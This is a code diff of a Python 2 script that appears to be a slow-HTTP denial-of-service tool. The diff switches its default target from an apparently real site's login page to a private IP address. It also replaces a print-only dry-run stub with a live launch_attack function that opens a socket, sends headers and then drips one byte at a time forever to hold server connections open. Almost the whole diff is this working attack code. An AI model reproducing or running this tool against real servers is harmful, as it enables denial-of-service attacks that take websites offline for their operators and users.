@@ -131,7 +131,7 @@ def get_cookies(target):
 def parse_args():
 
     return {
-        'target' : 'http://hackru.org/login',
+        'target' : 'http://192.168.99.230',
         'max_workers' : MAX_WORKERS,
         'user_agent_file' : '',
         'sleep_time' : SLEEP_TIME,
@@ -172,22 +172,22 @@ def configure():
         'sleep_time' : args['sleep_time'],
     }
 
-#def launch_attack(configs, headers):
-#
-#    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#    sock.connect((configs['host'], configs['port']))
-#    sock.send(headers)
-#    while True:
-#        sock.send("\x41")
-#        time.sleep(configs['sleep_time'])
-#    sock.close()
+def launch_attack(configs, headers):
 
-def launch_attack(i, configs, headers):
-
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((configs['host'], configs['port']))
+    sock.send(headers)
     while True:
-        print "Worker #%d: sending \x41" % i
+        sock.send("\x41")
         time.sleep(configs['sleep_time'])
-    print 'Worker #%d: closing connection' % i
+    sock.close()
+
+#def launch_attack(i, configs, headers):
+#
+#    while True:
+#        print "Worker #%d: sending \x41" % i
+#        time.sleep(configs['sleep_time'])
+#    print 'Worker #%d: closing connection' % i
 
 if __name__ == '__main__':
 
